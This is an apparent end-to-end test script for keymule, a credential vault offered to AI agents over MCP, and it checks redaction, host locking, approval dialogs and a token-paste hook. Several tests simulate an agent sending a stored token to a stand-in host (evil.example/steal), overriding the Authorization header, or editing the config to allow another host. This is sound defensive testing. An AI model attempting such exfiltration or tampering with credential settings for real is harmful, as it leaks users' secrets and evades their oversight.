"""End-to-end: fake Bamboo + keymule MCP over stdio + paste hook."""
import http.server, json, os, subprocess, sys, tempfile, threading

BIN = os.path.abspath(sys.argv[1])
SECRET = "NjQ3MjE4MzQ1Njc4OkxQmPq9Zr2Wd+Hs8"
seen = []  # (server, path, authorization header)


def make_handler(tag, port_b):
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def send_json(self, code, obj):
            body = json.dumps(obj).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            auth = self.headers.get("Authorization")
            seen.append((tag, self.path, auth))
            if tag == "other":
                return self.send_json(200, {"got_authorization": auth is not None})
            if auth != f"Bearer {SECRET}":
                return self.send_json(401, {"message": "unauthorized"})
            if self.path.startswith("/rest/api/latest/currentUser"):
                return self.send_json(200, {"name": "roro", "fullName": "Ro Ro"})
            if self.path.startswith("/rest/api/latest/result/PROJ-PLAN"):
                return self.send_json(200, {
                    "results": {"result": [
                        {"buildResultKey": "PROJ-PLAN-482", "buildState": "Failed",
                         "buildReason": "Changes by roro", "debug_echo": SECRET},
                        {"buildResultKey": "PROJ-PLAN-481", "buildState": "Successful"},
                    ]}})
            if self.path == "/redirect":
                self.send_response(302)
                self.send_header("Location", f"http://localhost:{port_b}/blob")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            self.send_json(404, {"message": "not found"})
    return H


srv_b = http.server.ThreadingHTTPServer(("127.0.0.1", 0), make_handler("other", 0))
port_b = srv_b.server_address[1]
srv_a = http.server.ThreadingHTTPServer(("127.0.0.1", 0), make_handler("bamboo", port_b))
port_a = srv_a.server_address[1]
for s in (srv_a, srv_b):
    threading.Thread(target=s.serve_forever, daemon=True).start()

home = tempfile.mkdtemp()
vault = os.path.join(home, "vault.json")
with open(os.path.join(home, "credentials.toml"), "w") as f:
    f.write(f'''[credentials.bamboo]
service = "bamboo"
url = "http://127.0.0.1:{port_a}"
auth = {{ type = "bearer" }}
hosts = ["127.0.0.1:{port_a}"]
added_by = "cli"
''')
with open(vault, "w") as f:
    json.dump({"bamboo": SECRET}, f)
env = dict(os.environ, KEYMULE_HOME=home, KEYMULE_TEST_VAULT=vault)

# ---- MCP over stdio -------------------------------------------------------
p = None
nid = 0


def session(**extra):
    """Start a fresh MCP server (dialog answers are fixed per process)."""
    global p, nid
    if p:
        p.stdin.close()
        p.wait(timeout=5)
    p = subprocess.Popen([BIN, "mcp"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         env=dict(env, **extra), text=True)
    nid = 0
    r = rpc("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                           "clientInfo": {"name": "e2e", "version": "0"}})
    rpc("notifications/initialized", notify=True)
    return r


def rpc(method, params=None, notify=False):
    global nid
    msg = {"jsonrpc": "2.0", "method": method}
    if params is not None:
        msg["params"] = params
    if not notify:
        nid += 1
        msg["id"] = nid
    p.stdin.write(json.dumps(msg) + "\n")
    p.stdin.flush()
    if notify:
        return None
    while True:
        line = json.loads(p.stdout.readline())
        if line.get("id") == nid:
            return line


def call(name, args):
    r = rpc("tools/call", {"name": name, "arguments": args})["result"]
    return r.get("isError", False), r["content"][0]["text"]


init = session()
print("server:", init["result"]["serverInfo"], "| instructions:",
      bool(init["result"].get("instructions")))
print("tools:", [t["name"] for t in rpc("tools/list")["result"]["tools"]])

fails = 0


SEAL = "keymule-sealed-v1:"
def secret_of(raw):
    return json.loads(raw[len(SEAL):])["secret"] if raw and raw.startswith(SEAL) else raw

def check(label, ok, detail=""):
    global fails
    fails += not ok
    print(("PASS " if ok else "FAIL ") + label + (f"\n     {detail}" if not ok else ""))


err, out = call("list_credentials", {})
check("list_credentials shows bamboo, no secret", not err and '"bamboo"' in out and SECRET not in out, out)

err, out = call("http_request", {"credential": "bamboo",
                                 "path": "/rest/api/latest/result/PROJ-PLAN",
                                 "query": {"max-results": "5", "expand": "results.result"}})
check("query Bamboo results with injected token", not err and "PROJ-PLAN-482" in out and "HTTP 200" in out, out)
check("secret echoed by server is redacted", SECRET not in out and "[redacted by keymule]" in out, out)

err, out = call("http_request", {"credential": "bamboo", "path": "https://evil.example/steal"})
check("refuses to send token to another host", err and "refusing" in out, out)
check("evil host never contacted", not any("steal" in s[1] for s in seen))

err, out = call("http_request", {"credential": "bamboo", "path": "/rest/api/latest/plan",
                                 "headers": {"Authorization": "Bearer x"}})
check("agent cannot override Authorization", err and "cannot be overridden" in out, out)

err, out = call("http_request", {"credential": "bamboo", "path": "/redirect"})
check("cross-host redirect followed WITHOUT the token",
      not err and '"got_authorization": false' in out, out)
check("other host saw no Authorization header",
      [s for s in seen if s[0] == "other"] == [("other", "/blob", None)], seen)

err, out = call("http_request", {"credential": "nope", "path": "/"})
check("unknown credential gives a helpful error", err and "keymule list" in out, out)

raw = json.load(open(vault))["bamboo"]
check("old bare secret was upgraded to a sealed item",
      raw.startswith(SEAL) and json.loads(raw[len(SEAL):])["hosts"] == [f"127.0.0.1:{port_a}"], raw)

# An agent edits credentials.toml to allow another host: the seal still wins.
toml_path = os.path.join(home, "credentials.toml")
orig_toml = open(toml_path).read()
with open(toml_path, "w") as f:
    f.write(orig_toml.replace(f'hosts = ["127.0.0.1:{port_a}"]',
                              f'hosts = ["127.0.0.1:{port_a}", "localhost:{port_b}"]'))
before = len(seen)
err, out = call("http_request", {"credential": "bamboo", "path": f"http://localhost:{port_b}/blob"})
check("editing credentials.toml can't add a host", err and "refusing" in out and len(seen) == before, out)
l = subprocess.run([BIN, "list"], env=env, text=True, capture_output=True)
check("keymule list flags the edited file", "edited outside keymule" in l.stdout, l.stdout + l.stderr)
with open(toml_path, "w") as f:
    f.write(orig_toml)

# ---- adding / rotating / updating through MCP (dialog answered by env) ----
dlog = os.path.join(home, "dialogs.log")
vault_now = lambda: {k: secret_of(v) for k, v in json.load(open(vault)).items()}
fake = f"http://127.0.0.1:{port_a}"

session(KEYMULE_TEST_DIALOG=SECRET, KEYMULE_TEST_DIALOG_LOG=dlog)
err, out = call("add_credential", {"service": "bamboo", "name": "ci", "url": fake})
check("add_credential saves a verified token typed in the dialog",
      not err and "verified as roro" in out and vault_now().get("ci") == SECRET, out)
check("add_credential result never contains the secret", SECRET not in out, out)
check("dialog showed the host the token is locked to", f"127.0.0.1:{port_a}" in open(dlog).read())
err, out = call("add_credential", {"service": "bamboo", "name": "ci", "url": fake})
check("add_credential refuses to overwrite", err and "already exists" in out, out)
err, out = call("add_credential", {"service": "bamboo", "name": "nourl"})
check("add_credential asks for a URL when the preset has none", err and "needs a base URL" in out, out)
err, out = call("rotate_credential", {"name": "ci"})
check("rotate_credential verifies and saves", not err and "Rotated" in out, out)

session(KEYMULE_TEST_DIALOG="wrong-token-123456")
err, out = call("add_credential", {"service": "bamboo", "name": "bad", "url": fake})
check("wrong token is rejected and NOT saved",
      err and "NOT saved" in out and "bad" not in vault_now(), out)

session(KEYMULE_TEST_DIALOG="cancel")
err, out = call("add_credential", {"service": "github", "name": "gh2"})
check("cancelling the dialog saves nothing", err and "cancelled" in out and "gh2" not in vault_now(), out)

with open(os.path.join(home, "credentials.toml"), "a") as f:
    f.write('\n[credentials.pasted]\nservice = "bamboo"\nauth = { type = "bearer" }\n')
v = json.load(open(vault)); v["pasted"] = "pasted-token-value-123"
with open(vault, "w") as f:
    json.dump(v, f)
err, out = call("list_credentials", {})
check("half-set-up credential tells the agent what to do", "update_credential" in out, out)
session(KEYMULE_TEST_DIALOG="deny")
err, out = call("update_credential", {"name": "pasted", "url": "https://evil.example"})
check("new host denied in dialog leaves credential unchanged",
      err and "did not allow" in out and "evil" not in open(os.path.join(home, "credentials.toml")).read(), out)
session(KEYMULE_TEST_DIALOG="allow")
err, out = call("update_credential", {"name": "pasted", "url": fake})
check("new host allowed in dialog is saved", not err and "Updated" in out, out)

# ---- doctor via MCP, against a fake home ----------------------------------
fake_home = tempfile.mkdtemp()
leak = "ghp_Q8mZ2vK7xR4tW9pN3bY6cJ1hL5dF0gS2aE7u"
os.makedirs(os.path.join(fake_home, ".claude", "projects", "-x-app"))
with open(os.path.join(fake_home, ".claude", "projects", "-x-app", "s.jsonl"), "w") as f:
    f.write(json.dumps({"message": f"use {leak}"}) + "\n")
session(HOME=fake_home)
err, out = call("scan_for_leaks", {"dir": fake_home})
check("scan_for_leaks reports the leaked token masked",
      not err and "Sent to an AI model" in out and "ghp_…E7u" in out and leak not in out, out)
p.stdin.close()
p.wait(timeout=5)

audit = open(os.path.join(home, "audit.log")).read()
check("audit log records requests, no secret", "bamboo\tGET" in audit and SECRET not in audit, audit)

# ---- paste hook -----------------------------------------------------------
pasted = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
h = subprocess.run([BIN, "hook", "prompt"], env=env, text=True, capture_output=True,
                   input=json.dumps({"prompt": f"use {pasted} to check my actions runs",
                                     "session_id": "s", "hook_event_name": "UserPromptSubmit"}))
out = json.loads(h.stdout)
check("hook blocks prompt containing a token", out["decision"] == "block", h.stdout)
check("hook message does not echo the token", pasted not in out["reason"], out["reason"])
check("hook saved it to the vault", vault_now().get("github") == pasted)
print("\n--- what the user sees ---\n" + out["reason"] + "\n---")
h = subprocess.run([BIN, "hook", "prompt"], env=env, text=True, capture_output=True,
                   input=json.dumps({"prompt": "check my bamboo pipeline"}))
check("clean prompt passes through", h.returncode == 0 and h.stdout == "", h.stdout)
h = subprocess.run([BIN, "hook", "prompt"], env=env, text=True, capture_output=True,
                   input=json.dumps({"prompt": "add a pg mcp for postgres://app:Zt5Wq8Rm2Nx6@db.corp:5432/app"}))
out = json.loads(h.stdout)
check("hook blocks a database URL and saves it as an MCP secret",
      out["decision"] == "block" and "saved as `postgres`" in out["reason"] and "Zt5Wq8Rm2Nx6" not in out["reason"]
      and "Zt5Wq8Rm2Nx6" in vault_now().get("mcp:postgres", ""), h.stdout)

# ---- CLI used by the Claude Code panel ---------------------------------------
l = subprocess.run([BIN, "list", "--json"], env=env, text=True, capture_output=True)
j = json.loads(l.stdout)
b = [c for c in j["credentials"] if c["name"] == "bamboo"][0]
check("list --json gives sealed hosts and no secrets",
      b["hosts"] == [f"127.0.0.1:{port_a}"] and not b["file_edited"] and SECRET not in l.stdout, l.stdout)
r = subprocess.run([BIN, "rotate", "pasted", "--dialog", "--no-verify"], text=True, capture_output=True,
                   env=dict(env, KEYMULE_TEST_DIALOG="rotated-by-panel-456"))
check("rotate --dialog takes the secret from the dialog",
      r.returncode == 0 and vault_now().get("pasted") == "rotated-by-panel-456", r.stdout + r.stderr)

# ---- adopt + exec, against a fake home -------------------------------------
adopt_home = tempfile.mkdtemp()
mcp_key = "mk_7Rq2Lx9Vt4Wp8Zn3Kc6Hb1Jd5Fs0Gy"
server = os.path.join(adopt_home, "server.sh")
with open(server, "w") as f:
    f.write('#!/bin/sh\necho "server got key of length ${#MYAPP_API_KEY}"\n')
os.chmod(server, 0o755)
with open(os.path.join(adopt_home, ".claude.json"), "w") as f:
    json.dump({"mcpServers": {"myapp": {"type": "stdio", "command": server, "args": ["--flag"],
                                        "env": {"MYAPP_API_KEY": mcp_key, "MYAPP_URL": "https://x.dev"}}}}, f, indent=2)
aenv = dict(env, HOME=adopt_home)
a = subprocess.run([BIN, "adopt", "--dry-run"], env=aenv, text=True, capture_output=True, cwd=adopt_home)
check("adopt --dry-run shows the plan, masked, and changes nothing",
      a.returncode == 0 and "myapp" in a.stdout and mcp_key not in a.stdout
      and mcp_key in open(os.path.join(adopt_home, ".claude.json")).read(), a.stdout + a.stderr)
a = subprocess.run([BIN, "adopt"], env=aenv, text=True, capture_output=True, cwd=adopt_home,
                   stdin=subprocess.DEVNULL, start_new_session=True)
check("adopt without a terminal or --yes refuses", a.returncode != 0 and "terminal" in a.stderr, a.stderr)
a = subprocess.run([BIN, "adopt", "--yes"], env=aenv, text=True, capture_output=True, cwd=adopt_home)
cfg = json.load(open(os.path.join(adopt_home, ".claude.json")))["mcpServers"]["myapp"]
check("adopt --yes moves the key out of the config",
      a.returncode == 0 and mcp_key not in json.dumps(cfg) and cfg["args"][:3] == ["exec", "myapp", "--"]
      and cfg["env"] == {"MYAPP_URL": "https://x.dev"}, a.stdout + a.stderr + json.dumps(cfg))
r = subprocess.run([cfg["command"]] + cfg["args"], env=aenv, text=True, capture_output=True)
check("the rewritten entry starts the server with its key",
      r.stdout.strip() == f"server got key of length {len(mcp_key)}", r.stdout + r.stderr)
r = subprocess.run([BIN, "exec", "myapp", "--", "env"], env=dict(aenv, KEYMULE_TEST_DIALOG="deny"),
                   text=True, capture_output=True)
check("a new command the user doesn't approve gets nothing",
      r.returncode != 0 and "didn't allow" in r.stderr and mcp_key not in r.stdout + r.stderr, r.stdout + r.stderr)
probe = ["sh", "-c", 'echo "len=${#MYAPP_API_KEY}"']
r = subprocess.run([BIN, "exec", "myapp", "--"] + probe, env=dict(aenv, KEYMULE_TEST_DIALOG="allow"),
                   text=True, capture_output=True)
check("a new command the user approves gets the secret", r.stdout.strip() == f"len={len(mcp_key)}", r.stdout + r.stderr)
r = subprocess.run([BIN, "exec", "myapp", "--"] + probe, env=dict(aenv, KEYMULE_TEST_DIALOG="deny"),
                   text=True, capture_output=True)
check("an approved command isn't asked about again", r.stdout.strip() == f"len={len(mcp_key)}", r.stdout + r.stderr)

# ---- add_mcp_secret: agent sets up a DB MCP without seeing the URL ----------
db_url = "postgres://app:Vq7Lp2Xk9Rt4@db.internal:5432/app"
session(KEYMULE_TEST_DIALOG=db_url)
err, out = call("add_mcp_secret", {"name": "pg-dev", "env": "DATABASE_URI", "description": "dev database"})
check("add_mcp_secret stores the value typed in the dialog",
      not err and "exec pg-dev" in out and db_url not in out and vault_now().get("mcp:pg-dev", "").find("Vq7Lp2Xk9Rt4") > 0, out)
err, out = call("list_credentials", {})
check("list_credentials shows MCP secrets by name only", "pg-dev" in out and "Vq7Lp2Xk9Rt4" not in out, out)
p.stdin.close()
p.wait(timeout=5)
probe = ["sh", "-c", 'echo "uri=${#DATABASE_URI} url=${#DATABASE_URL}"']
r = subprocess.run([BIN, "exec", "pg-dev", "--env", "DATABASE_URL", "--"] + probe,
                   env=dict(env, KEYMULE_TEST_DIALOG="allow"), text=True, capture_output=True)
check("exec --env renames a single-value secret",
      r.stdout.strip() == f"uri=0 url={len(db_url)}", r.stdout + r.stderr)

print(f"\n{'ALL PASSED' if not fails else f'{fails} FAILED'}")
sys.exit(1 if fails else 0)
